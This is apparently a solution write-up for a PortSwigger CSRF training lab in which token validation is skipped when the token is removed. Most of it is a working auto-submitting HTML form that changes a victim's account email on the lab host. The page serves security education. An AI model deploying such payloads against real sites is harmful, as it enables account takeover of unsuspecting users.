# Lab: CSRF where token validation depends on token being present

**Link**: https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present

**Solution**:

Notice that there is no csrf validation if deleted

generate the following html

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0af800e804325d24c302dd2800dd0049.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="mohamed&#46;abdelrahman9996&#64;yahoo&#46;comaa" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

<p align="center" width="100%">
  <img src="https://github.com/aboelkassem/portswigger-labs/blob/main/CSRF/Lab%20CSRF%20where%20token%20validation%20depends%20on%20token%20being%20present/image1.png" width="500" hight="500"/>
</p>
